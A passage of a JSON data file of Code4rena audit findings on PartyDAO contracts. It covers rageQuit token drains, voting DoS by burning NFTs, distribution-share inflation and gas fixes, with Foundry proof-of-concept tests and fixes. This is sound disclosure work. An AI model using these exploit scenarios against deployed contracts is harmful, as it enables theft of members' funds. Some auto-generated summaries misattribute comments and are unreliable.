      "title": "[M-05] Tokens with multiple entry points can lead to loss of funds in `rageQuit()`",
      "impact": "MEDIUM",
      "content": "\nERC20 tokens with multiple entry points (also known as double entry tokens or two address tokens) can be used to exploit the `rageQuit()` function and steal funds from the party.\n\nThe `rageQuit()` function can be used by a party member to exit their position and claim their share of tokens present in the party. The implementation takes an arbitrary array of tokens and transfers the corresponding amount of each to the given receiver:\n\n<https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L323-L346>\n\n```solidity\n323:             IERC20 prevToken;\n324:             for (uint256 j; j < withdrawTokens.length; ++j) {\n325:                 IERC20 token = withdrawTokens[j];\n326: \n327:                 // Prevent null and duplicate transfers.\n328:                 if (prevToken >= token) revert InvalidTokenOrderError();\n329: \n330:                 prevToken = token;\n331: \n332:                 // Check if token is ETH.\n333:                 if (address(token) == ETH_ADDRESS) {\n334:                     // Transfer fair share of ETH to receiver.\n335:                     uint256 amount = (address(this).balance * shareOfVotingPower) / 1e18;\n336:                     if (amount != 0) {\n337:                         payable(receiver).transferEth(amount);\n338:                     }\n339:                 } else {\n340:                     // Transfer fair share of tokens to receiver.\n341:                     uint256 amount = (token.balanceOf(address(this)) * shareOfVotingPower) / 1e18;\n342:                     if (amount != 0) {\n343:                         token.compatTransfer(receiver, amount);\n344:                     }\n345:                 }\n346:             }\n```\n\nThe function correctly considers potential duplicate elements in the array. Line 328 validates that token addresses are in ascending order and that the address from the previous iteration is different from the address of the current iteration, effectively disallowing duplicates.\n\nHowever, this isn't enough protection against [tokens with multiple addresses](https://github.com/d-xo/weird-erc20#multiple-token-addresses). If the token has more than one entry point, then a bad actor can submit all of them to the `rageQuit()` function in order to execute the withdrawal multiple times, one for each available entry point. This will lead to the loss of funds to other party members, as this vulnerability can be exploited by an attacker to withdraw more tokens than deserved.\n\n### Proof of concept\n\nLet's assume there is a token with two entry points in address A and address B. The party holds 100 of these tokens and Alice, a party member, has an NFT corresponding to 50% of the total voting power.\n\nAlice decides to exit her position by calling `rageQuit()`. Under normal circumstances, she would get 50 tokens, as she has 50% of the share in the party. However, Alice calls `rageQuit()` passing both address A and address B in the `withdrawTokens` array. As these are different addresses, the implementation will consider the argument valid, and execute the withdrawal two times. For the first address, Alice will be transferred 50 tokens (100 &ast; 50% = 50), and for the other address, she will be transferred an additional of 25 tokens (50 &ast; 50% = 25).\n\n### Recommendation\n\nThere is no easy solution for the issue. The usual recommendation in these cases is to implement a whitelist of supported tokens, but this will bring complexity and undermine the flexibility of the Party implementation.\n\nAnother alternative would be to first do a \"snapshot\" of available balances for the given tokens, and then, while executing the withdrawals, compare the current balance with the snapshot in order to detect changes:\n\n1.  Loop through each token and store the balance of the party contract, i.e. `previousBalances[i] = withdrawTokens[i].balanceOf(address(this))`.\n2.  Loop again through each token to execute withdrawals, but first check that the current balance matches the previous balance, i.e. `require(previousBalances[i] == withdrawTokens[i].balanceOf(address(this)))`.\n\nIf balances don't match, this means that a previous withdrawal affected the balance of the current token, which may indicate and prevent a potential case of a token with multiple entry points.\n\n### Assessed type\n\nToken-Transfer\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-05-party-findings/issues/14#issuecomment-1569141988):**\n > Feel like this should be a QA, it can lead to loss of funds but only under the specific circumstance that a party holds two address tokens, which practically is very rare.\n\n**[cccz (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-party-findings/issues/14#issuecomment-1569582154):**\n > TrueUSD is an example and has a fairly high market volume: https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2\n> \n> Similar issues can be found in https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886\n> \n> But the difference is that in #886 the attacker is actively depositing TrueUSD to make the attack, while this issue requires the victim to deposit TrueUSD, and then the attacker can get more TrueUSD, so I would consider this to be M\n\n**[0x52 (warden) commented](https://github.com/code-423n4/2023-05-party-findings/issues/14#issuecomment-1569949336):**\n > Worth mentioning, the secondary entry to TrueUSD was disabled as a response to this type of vulnerability, so this is no longer possible. Not sure if any other notable tokens implement this pattern.\n\n**[0xble (Party) acknowledged](https://github.com/code-423n4/2023-05-party-findings/issues/14#issuecomment-1572318524)**\n\n***\n\n",
      "summary": "\nA bug report has been raised concerning the `rageQuit()` function in the PartyGovernanceNFT contract. This function is used by a party member to exit their position and claim their share of tokens present in the party. The bug is related to ERC20 tokens with multiple entry points, which can be used to exploit the `rageQuit()` function and steal funds from the party.\n\nThe bug exists because the implementation doesn't take into account tokens with multiple entry points. If the token has more than one entry point, then a bad actor can submit all of them to the `rageQuit()` function in order to execute the withdrawal multiple times, one for each available entry point. This will lead to the loss of funds to other party members, as this vulnerability can be exploited by an attacker to withdraw more tokens than deserved.\n\nA proof of concept has been provided to demonstrate the exploit. Let's assume there is a token with two entry points in address A and address B. The party holds 100 of these tokens and Alice, a party member, has an NFT corresponding to 50% of the total voting power. Alice calls `rageQuit()` passing both address A and address B in the `withdrawTokens` array. As these are different addresses, the implementation will consider the argument valid, and execute the withdrawal two times. For the first address, Alice will be transferred 50 tokens (100 &ast; 50% = 50), and for the other address, she will be transferred an additional of 25 tokens (50 &ast; 50% = 25).\n\nThe usual recommendation in these cases is to implement a whitelist of supported tokens, but this will bring complexity and undermine the flexibility of the Party implementation. Another alternative would be to first do a \"snapshot\" of available balances for the given tokens, and then, while executing the withdrawals, compare the current balance with the snapshot in order to detect changes.\n\nIt is worth mentioning that the secondary entry to TrueUSD was disabled as a response to this type of vulnerability, so this is no longer possible. Not sure if any other notable tokens implement this pattern.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/14",
      "tags": [],
      "finders": [
        "adriro",
        "hansfriese"
      ]
    },
    {
      "id": "20141",
      "title": "[M-04] Rage quit modifications should be limited to provide stronger guarantees to party members",
      "impact": "MEDIUM",
      "content": "\n\nParty hosts can arbitrarily change the rage quit settings overriding any existing preset.\n\nRage quit is implemented in the `PartyGovernanceNFT` contract by using a timestamp. Leaving aside the cases of permanent settings (which, of course, cannot be changed) this implementation allows a more flexible feature than a simple enable/disable toggle. The timestamp represents the time until rage quit is allowed. If the timestamp is still in the future, then rage quit is enabled. If it is in the past, the feature is disabled.\n\nThis setting can be changed at will by party hosts. At any moment and without any restriction (other than the permanent enabled or disabled, which cannot be modified), the party host is allowed to change the value to **any arbitrary date**. This means that an already scheduled setting that would allow rage quit until a certain future date, can be simply overridden and changed by the party host.\n\nA party member can feel secure knowing it has the option to rage quit until the defined timestamp in `rageQuitTimestamp`. However, any party host can arbitrarily reduce or completely disable the feature, ignoring any preset.\n\nThis is particularly concerning, as it defeats the purpose of having a programmable expiration date of the rage quit feature. The allowed modifications should ensure members are covered at least until the agreed timestamp (i.e. extend it or leave it as it is to disable rage quit the moment the timestamp expires), or provide better guarantees against arbitrary changes.\n\n### Recommendation\n\nHere are some alternatives that should be taken as ideas to be used individually or in some combination:\n\n1.  Ensure rage quit cannot be disabled at least until the currently defined timestamp.\n2.  Rage quit can only be reduced by a certain amount of time (for example, a percentage of the remaining time).\n3.  Rage quit can only be changed once per period of time.\n4.  If rage quit is currently enabled, then ensure the timestamp is not decreased below the latest proposal execution time.\n\n**[0xble (Party) acknowledged](https://github.com/code-423n4/2023-05-party-findings/issues/16#issuecomment-1572327334)**\n\n***\n\n",
      "summary": "\nA bug report has been filed regarding the implementation of the rage quit feature in the `PartyGovernanceNFT` contract. Currently, the setting can be changed arbitrarily by the party host, overriding any existing preset. This means that a party member can no longer feel secure that they can rage quit until the agreed timestamp, as the feature can be completely disabled or reduced at any time. \n\nTo address this issue, 0xble (Party) has acknowledged some potential solutions. These include ensuring rage quit cannot be disabled until the current timestamp, reducing rage quit by a certain amount of time, only allowing rage quit to be changed once per period of time, and ensuring the timestamp is not decreased below the latest proposal execution time. \n\nOverall, the bug report highlights the need for better guarantees against arbitrary changes in the rage quit feature, to ensure party members are covered at least until the agreed timestamp.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/16",
      "tags": [],
      "finders": [
        "d3e4",
        "adriro",
        "0x52",
        "gjaldon"
      ]
    },
    {
      "id": "20140",
      "title": "[M-03] Burning an NFT can be used to block voting",
      "impact": "MEDIUM",
      "content": "\nA new validation in the `accept()` function has been introduced in order to mitigate a potential attack to the party governance.\n\nBy burning an NFT, a party member can reduce the total voting power of the party just before creating a proposal and voting for it. Since the snapshot used to vote is previous to this action, this means the user can still use their burned voting power while voting in a proposal with a reduced total voting power. This is stated in the comment attached to the new validation:\n\n<https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernance.sol#L589-L598>\n\n```solidity\n589:         // Prevent voting in the same block as the last burn timestamp.\n590:         // This is to prevent an exploit where a member can burn their card to\n591:         // reduce the total voting power of the party, then propose and vote in\n592:         // the same block since `getVotingPowerAt()` uses `values.proposedTime - 1`.\n593:         // This would allow them to use the voting power snapshot just before\n594:         // their card was burned to vote, potentially passing a proposal that\n595:         // would have otherwise not passed.\n596:         if (lastBurnTimestamp == block.timestamp) {\n597:             revert CannotRageQuitAndAcceptError();\n598:         }\n```\nThis change can be abused by a bad actor in order to DoS the voting of a proposal. The call to `accept()` can be front-runned with a call to `burn()`, which would trigger the revert in the original transaction.\n\nWhile this is technically possible, it is not likely that a party member would burn their NFT just to DoS a voting for a single block. However, it might be possible to mint an NFT with zero voting power (in order to keep the voting power unaltered) and burn it in order to block calls to `accept()`.\n\n### Proof of concept\n\nThe following test reproduces the issue. Bob's transaction to `accept()` is front-runned and blocked by minting a zero voting power NFT and immediately burning it.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/9a9868c7c3f540811eff6853db14bfc6).\n\n```solidity\nfunction test_PartyGovernanceNFT_BlockVoting() external {\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n    address authority = makeAddr(\"authority\");\n\n    (Party party, , ) = partyAdmin.createParty(\n        partyImpl,\n        PartyAdmin.PartyCreationMinimalOptions({\n            host1: address(this),\n            host2: address(0),\n            passThresholdBps: 5100,\n            totalVotingPower: 100,\n            preciousTokenAddress: address(toadz),\n            preciousTokenId: 1,\n            rageQuitTimestamp: 0,\n            feeBps: 0,\n            feeRecipient: payable(0)\n        })\n    );\n\n    vm.prank(address(party));\n    party.addAuthority(authority);\n\n    // Mint voting power to alice and bob\n    vm.startPrank(address(partyAdmin));\n\n    uint256 aliceToken = party.mint(alice, 50, alice);\n    uint256 bobTokenId = party.mint(bob, 50, bob);\n\n    vm.stopPrank();\n\n    // Alice creates proposal\n    vm.startPrank(alice);\n\n    uint256 proposalId = party.propose(\n        PartyGovernance.Proposal({\n            maxExecutableTime: uint40(type(uint40).max),\n            cancelDelay: uint40(1 days),\n            proposalData: abi.encode(0)\n        }),\n        0\n    );\n\n    vm.stopPrank();\n\n    // Bob is going to vote for proposal but is front-runned by authority to block voting\n    // Authority mints a 0 voting token and burns it\n    vm.prank(authority);\n    uint256 dummyTokenId = party.mint(authority, 0, authority);\n    vm.prank(authority);\n    party.burn(dummyTokenId);\n    // Bob transaction reverts\n    vm.expectRevert(PartyGovernance.CannotRageQuitAndAcceptError.selector);\n    vm.prank(bob);\n    party.accept(proposalId, 0);\n}\n```\n\n### Recommendation\n\nIt is difficult to provide a solution without changing how voting works at the general level in the governance contracts. The issue can be partially mitigated by moving the check to the `proposal()` function. This would prevent the DoS on the `accept()` function while still mitigating the original issue, but would allow the same attack to be performed while members try to create proposals.\n\n### Assessed type\n\nDoS\n\n**[0xble (Party) acknowledged](https://github.com/code-423n4/2023-05-party-findings/issues/19#issuecomment-1572327492)**\n\n***\n\n",
      "summary": "\nA bug has been identified in the `accept()` function of the Party Governance contract. This bug could be exploited by a bad actor to DoS the voting of a proposal by front-running a call to `accept()` with a call to `burn()`, which would trigger a revert in the original transaction. This is because a new validation has been introduced in the `accept()` function which prevents voting in the same block as the last burn timestamp. This is to prevent an exploit where a member can burn their card to reduce the total voting power of the party, then propose and vote in the same block since the voting power snapshot used is previous to the action.\n\nA proof of concept was provided which showed that Bob's transaction to `accept()` was front-runned and blocked by minting a zero voting power NFT and immediately burning it.\n\nIt is difficult to provide a solution without changing how voting works at the general level in the governance contracts. However, the issue can be partially mitigated by moving the check to the `proposal()` function. This would prevent the DoS on the `accept()` function while still mitigating the original issue, but would allow the same attack to be performed while members try to create proposals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/19",
      "tags": [
        "Vote"
      ],
      "finders": [
        "d3e4",
        "adriro",
        "hansfriese",
        "gjaldon"
      ]
    },
    {
      "id": "20139",
      "title": "[M-02] Rage quitter loses his claimable share of distributed tokens",
      "impact": "MEDIUM",
      "content": "\n### Proof of Concept\n\n[`PartyGovernanceNFT.rageQuit()`](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernanceNFT.sol#L293-L353) burns a governance NFT and transfers its share of the balance of ETH and tokens:\n\n```solidity\n// Burn caller's party card. This will revert if caller is not the owner\n// of the card.\nburn(tokenId);\n\n// Withdraw fair share of tokens from the party.\nIERC20 prevToken;\nfor (uint256 j; j < withdrawTokens.length; ++j) {\n    IERC20 token = withdrawTokens[j];\n\n    // Prevent null and duplicate transfers.\n    if (prevToken >= token) revert InvalidTokenOrderError();\n\n    prevToken = token;\n\n    // Check if token is ETH.\n    if (address(token) == ETH_ADDRESS) {\n        // Transfer fair share of ETH to receiver.\n        uint256 amount = (address(this).balance * shareOfVotingPower) / 1e18;\n        if (amount != 0) {\n            payable(receiver).transferEth(amount);\n        }\n    } else {\n        // Transfer fair share of tokens to receiver.\n        uint256 amount = (token.balanceOf(address(this)) * shareOfVotingPower) / 1e18;\n        if (amount != 0) {\n            token.compatTransfer(receiver, amount);\n        }\n    }\n}\n```\nThe problem with this is that the governance NFT might also have tokens to [`claim()`](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L138-L182) in the `TokenDistributor`. These cannot be claimed after the governance NFT has been burned.\n\nThe rage quitter cannot completely protect himself from this by calling `claim()` first, because the tokens might not yet have been distributed to the `TokenDistributor` until in a frontrun call to [`distribute()`](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernance.sol#L474-L520) just before his `rageQuit()`. This way the rage quitter might be robbed of his fair share.\n\n### Recommended Mitigation Steps\n\nHave `rageQuit()` call `TokenDistributor.claim()` before the governance NFT is burned.\n\n### Assessed type\n\nContext\n\n**[cccz (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-party-findings/issues/22#issuecomment-1569558622):**\n > Similar issues are considered M in C4. Loss of funds requires external requirements (user misses call to claim() or frontrun occurs).<br>\n> Also, since the claim() only allows NFT owner to call, consider transferring the user's NFT to the contract in rageQuit().\n> ```solidity\n>     function claim(\n>         DistributionInfo calldata info,\n>         uint256 partyTokenId\n>     ) public returns (uint128 amountClaimed) {\n>         // Caller must own the party token.\n>         {\n>             address ownerOfPartyToken = info.party.ownerOf(partyTokenId);\n>             if (msg.sender != ownerOfPartyToken) {\n>                 revert MustOwnTokenError(msg.sender, ownerOfPartyToken, partyTokenId);\n>             }\n>         }\n> ```\n\n**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-05-party-findings/issues/22#issuecomment-1572354438):**\n > We will warn users with unclaimed distributions on the frontend but will not make any code changes to enforce this.\n\n**[adriro (warden) commented](https://github.com/code-423n4/2023-05-party-findings/issues/22#issuecomment-1577180233):**\n > @cccz (judge) I think this issue should be more on the QA side as the sponsor clearly stated that rage quit may cause losses due to user inaction or mistake:\n> \n> > If a user intentionally or accidentally excludes a token in their ragequit, they forfeit that token and will not be able to claim it.\n> \n> Similar to the described scenario, if a user forgets to call claim on the distributor before rage quitting, they will lose their share of tokens.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-05-party-findings/issues/22#issuecomment-1577900036):**\n > In this issue, even if the user does not make any mistake, they may suffer a loss because there may be a potential frontrun attack.\n\n***\n\n",
      "summary": "\nThis bug report is about the `PartyGovernanceNFT.rageQuit()` function in the `PartyGovernanceNFT` contract. This function burns a governance NFT and transfers its share of the balance of ETH and tokens. The problem with this is that the governance NFT might also have tokens to `claim()` in the `TokenDistributor`, which cannot be claimed after the governance NFT has been burned. The rage quitter cannot protect himself from this by calling `claim()` first, because the tokens might not yet have been distributed to the `TokenDistributor` until in a frontrun call to `distribute()` just before his `rageQuit()`. This way the rage quitter might be robbed of his fair share.\n\nThe recommended mitigation step is to have `rageQuit()` call `TokenDistributor.claim()` before the governance NFT is burned. The judge decreased the severity of the bug to medium, stating that although the user may suffer a loss due to a potential frontrun attack, the issue should be more on the QA side as the sponsor clearly warned that rage quit may cause losses due to user inaction or mistake. The sponsor acknowledged the bug and stated that they will warn users with unclaimed distributions on the frontend but will not make any code changes to enforce this.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/22",
      "tags": [],
      "finders": [
        "d3e4",
        "adriro",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "20138",
      "title": "[M-01] rageQuit() cannot transfer ERC1155 fungible tokens",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernanceNFT.sol#L332-L345>\n\nRage quitter loses his ERC1155 fungible tokens.\n\n### Proof of Concept\n\n`PartyGovernanceNFT` is PartyGovernance which is an `ERC1155Receiver`. But `rageQuit()` only sends ETH, with `call()`, and ERC20-tokens, with `transfer()`. ERC1155-tokens are transferred by `safeTransferFrom()` and its `balanceOf()`also takes an `uint256 _id` parameter. This means that the rage quitter cannot withdraw any of his fair share of ERC1155 fungible tokens.\n\n### Recommended Mitigation Steps\n\nInclude support for ERC1155 in `rageQuit()`.\n\n**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-05-party-findings/issues/23):**\n\n >This is by design, feel like this should be a QA.\n > \n >ERC1155 tokens are tricky because they sometimes behave like NFTs and other times like ERC20s. If they are not fungible, they shouldn't be allowed to be taken out of the treasury during rage quit so that makes allowing them to be rage-quitted dependent on how the 1155 is implemented.\n\n**[d3e4 (warden) commented](https://github.com/code-423n4/2023-05-party-findings/issues/23):**\n > @0xble - If the ERC1155 is non-fungible, the contract will only own a single token. Any share less than the whole will be rounded down to zero tokens sent when rage quitting. The same calculation can be used for ERC1155 tokens as for ERC20 tokens, without having to explicitly consider whether they are fungible or not.\n\n**[cccz (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-05-party-findings/issues/23):**\n > I would say this is an undocumented value leakage issue, the contract is designed to receive ERC1155, and the documentation says the user can withdraw fungible tokens on rage quit.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-05-party-findings/issues/23):**\n > ERC1155s aren't always fungible and we knew this when designing it. Sometimes they behave like ERC20s and other times as ERC721s. If it was the latter, it would lead to a loss of funds.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-05-party-findings/issues/23):**\n > Agree with you, but a value leak does exist here that meets the C4 medium risk criteria. And the following suggestion I think is appropriate:\n >\n >>ERC1155 tokens are tricky because they sometimes behave like NFTs and other times like ERC20s. If they are not fungible, they shouldn't be allowed to be taken out of the treasury during rage quit so that makes allowing them to be rage-quitted dependent on how the 1155 is implemented.\n >>\n >>If the ERC1155 is non-fungible the contract will only own a single token, so any share less than the whole will be rounded down to zero tokens sent when rage quitting. So exactly the same calculation can be used for ERC1155 tokens as for ERC20 tokens, without having to explicitly consider whether they are fungible or not.\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-05-party-findings/issues/23).*\n\n***\n",
      "summary": "\nA bug has been identified in the `PartyGovernanceNFT` contract which is part of the code-423n4/2023-05-party repository. The bug affects users who try to use the rageQuit() function, which is designed to allow users to withdraw their funds from the contract. The bug causes users to lose their ERC1155 fungible tokens when they try to withdraw their funds.\n\nThe bug is caused by the fact that the rageQuit() function only supports ETH and ERC20 tokens, but not ERC1155 tokens. ERC1155 tokens are transferred using `safeTransferFrom()` and the `balanceOf()` method takes an `uint256 _id` parameter, which means that the rage quitter cannot withdraw any of their ERC1155 fungible tokens.\n\nThe recommended mitigation steps for this bug include adding support for ERC1155 tokens in the rageQuit() function. The issue has been acknowledged by 0xble (Party) and d3e4 (warden) and cccz (judge) has increased the severity to Medium. 0xble (Party) has commented that ERC1155 tokens are tricky because they can sometimes behave like NFTs and other times like ERC20s, and if the tokens are not fungible, they should not be allowed to be taken out of the treasury during rage quit. d3e4 (warden) has suggested that the same calculation can be used for ERC1155 tokens as for ERC20 tokens, without having to explicitly consider whether they are fungible or not. cccz (judge) has agreed with this suggestion and has stated that a value leak does exist which meets the C4 medium risk criteria.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/23",
      "tags": [],
      "finders": [
        "d3e4"
      ]
    },
    {
      "id": "20137",
      "title": "[H-01] The distribution logic will be broken after calling `rageQuit()`",
      "impact": "HIGH",
      "content": "\nMalicious users might receive more distributed funds than they should with higher `distributionShare`.\n\n### Proof of Concept\n\nIn `PartyGovernanceNFT.sol`, there is a `getDistributionShareOf()` function to calculate the distribution share of party NFT.\n\n```solidity\n    function getDistributionShareOf(uint256 tokenId) public view returns (uint256) {\n        uint256 totalVotingPower = _governanceValues.totalVotingPower;\n\n        if (totalVotingPower == 0) {\n            return 0;\n        } else {\n            return (votingPowerByTokenId[tokenId] * 1e18) / totalVotingPower;\n        }\n    }\n```\n\nThis function is used to calculate the claimable amount in [getClaimAmount()](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L234).\n\n```solidity\n    function getClaimAmount(\n        ITokenDistributorParty party,\n        uint256 memberSupply,\n        uint256 partyTokenId\n    ) public view returns (uint128) {\n        // getDistributionShareOf() is the fraction of the memberSupply partyTokenId\n        // is entitled to, scaled by 1e18.\n        // We round up here to prevent dust amounts getting trapped in this contract.\n        return\n            ((uint256(party.getDistributionShareOf(partyTokenId)) * memberSupply + (1e18 - 1)) /\n                1e18).safeCastUint256ToUint128();\n    }\n```\n\nSo after the party distributed funds by executing the distribution proposal, users can claim relevant amounts of funds using their party NFTs.\n\nAfter the update, `rageQuit()` was added so that users can burn their party NFTs while taking their share of the party's funds.\n\nSo the below scenario would be possible.\n\n1.  Let's assume `totalVotingPower = 300` and the party has 3 party NFTs of 100 voting power. And `Alice` has 2 NFTs and `Bob` has 1 NFT.\n2.  They proposed a distribution proposal and executed it. Let's assume the party transferred 3 ether to the distributor.\n3.  They can claim the funds by calling [TokenDistributor.claim()](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L138) and `Alice` should receive 2 ether and 1 ether for `Bob`.(We ignore the distribution fee.)\n4.  But `Alice` decided to steal `Bob`'s funds so she claimed the distributed funds(3 / 3 = 1 ether) with the first NFT and called `rageQuit()` to take her share of the party's remaining funds.\n5.  After that, `Alice` calls `claim()` with the second NFT, and `getDistributionShareOf()` will return 50% as the total voting power was decreased to 200. So `Alice` will receive `3 * 50% = 1.5 ether` and `Bob` will receive only 0.5 ether because of this [validation](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L167)\n6.  After all, `Alice` received 2.5 ether instead of 2 ether.\n\nEven if `rageQuit` is disabled, `Alice` can burn, using `burn()`, her NFT directly if her share of the party's remaining funds are less than the stolen funds from `Bob`.\n\nHere is a simple POC showing the distribution shares after `rageQuit()`.\n\n```solidity\n    function testWrongDistributionSharesAfterRageQuit() external {\n        (Party party, , ) = partyAdmin.createParty(\n            partyImpl,\n            PartyAdmin.PartyCreationMinimalOptions({\n                host1: address(this),\n                host2: address(0),\n                passThresholdBps: 5100,\n                totalVotingPower: 300,\n                preciousTokenAddress: address(toadz),\n                preciousTokenId: 1,\n                rageQuitTimestamp: 0,\n                feeBps: 0,\n                feeRecipient: payable(0)\n            })\n        );\n\n        vm.prank(address(this));\n        party.setRageQuit(uint40(block.timestamp) + 1);\n\n        address user1 = _randomAddress();\n        address user2 = _randomAddress();\n        address user3 = _randomAddress();\n\n        //3 users have the same voting power\n        vm.prank(address(partyAdmin));\n        uint256 tokenId1 = party.mint(user1, 100, user1);\n\n        vm.prank(address(partyAdmin));\n        uint256 tokenId2 = party.mint(user2, 100, user2);\n\n        vm.prank(address(partyAdmin));\n        uint256 tokenId3 = party.mint(user3, 100, user3);\n\n        vm.deal(address(party), 1 ether);\n\n        // Before calling rageQuit(), each user has the same 33.3333% shares\n        uint256 expectedShareBeforeRageQuit = uint256(100) * 1e18 / 300;\n        assertEq(party.getDistributionShareOf(tokenId1), expectedShareBeforeRageQuit);\n        assertEq(party.getDistributionShareOf(tokenId2), expectedShareBeforeRageQuit);\n        assertEq(party.getDistributionShareOf(tokenId3), expectedShareBeforeRageQuit);\n\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = IERC20(ETH_ADDRESS);\n        uint256[] memory tokenIds = new uint256[](1);\n        tokenIds[0] = tokenId1;\n\n        vm.prank(user1);\n        party.rageQuit(tokenIds, tokens, user1);\n\n        // After calling rageQuit() by one user, the second user has 50% shares and can claim more distribution\n        uint256 expectedShareAfterRageQuit = uint256(100) * 1e18 / 200;\n        assertEq(party.getDistributionShareOf(tokenId2), expectedShareAfterRageQuit);\n    }\n```\n### Recommended Mitigation Steps\n\nI think we shouldn't use `getDistributionShareOf()` for distribution shares.\n\nInstead, we should remember `totalVotingPower` for each distribution separately in [\\_createDistribution()](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L310) so that each user can receive correct funds even after some NFTs are burnt.\n\n### Assessed type\n\nGovernance\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-05-party-findings/issues/6#issuecomment-1572311569)**\n\n***\n",
      "summary": "\nA bug has been identified in the 0xble Party Governance NFT contract, which allows malicious users to receive more distributed funds than they should with higher `distributionShare`. \n\nThe issue arises from the `getDistributionShareOf()` function, which is used to calculate the claimable amount in the `getClaimAmount()` function. This function calculates the fraction of the memberSupply partyTokenId is entitled to, scaled by 1e18. \n\nThe issue arises when users can burn their party NFTs while taking their share of the party's funds using the `rageQuit()` function. This allows malicious users to call `getDistributionShareOf()` with the second NFT, and receive a higher share of the funds. \n\nA simple proof of concept has been provided to demonstrate the issue. \n\nTo mitigate this issue, it is recommended to remember `totalVotingPower` for each distribution separately in `_createDistribution()` so that each user can receive correct funds even after some NFTs are burnt.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/6",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "20015",
      "title": "[G-05] Use `mintedVotingPower_` instead of `mintedVotingPower`",
      "impact": "GAS",
      "content": "Gas saved: 114 per tx per instance\n\n```diff\ndiff --git a/contracts/party/PartyGovernanceNFT.sol b/contracts/party/PartyGovernanceNFT.sol\nindex 9ccfa1f..c6c3d14 100644\n--- a/contracts/party/PartyGovernanceNFT.sol\n+++ b/contracts/party/PartyGovernanceNFT.sol\n@@ -149,7 +149,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {\n \n         // Update state.\n         tokenId = tokenCount = tokenCount_ + 1;\n-        mintedVotingPower += votingPower_;\n+        mintedVotingPower = mintedVotingPower_ + votingPower_;\n         votingPowerByTokenId[tokenId] = votingPower_;\n \n         // Use delegate from party over the one set during crowdfund.\n@@ -181,7 +181,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {\n         }\n \n         // Update state.\n-        mintedVotingPower += votingPower_;\n+        mintedVotingPower = mintedVotingPower_ + votingPower_;\n         votingPowerByTokenId[tokenId] += votingPower_;\n \n         _adjustVotingPower(ownerOf(tokenId), votingPower_.safeCastUint96ToInt192(), address(0));\n```\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/23#issuecomment-1513577421)**\n\n\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20014",
      "title": "[G-04] Save `votingPowerByCard[i]` in memory variable",
      "impact": "GAS",
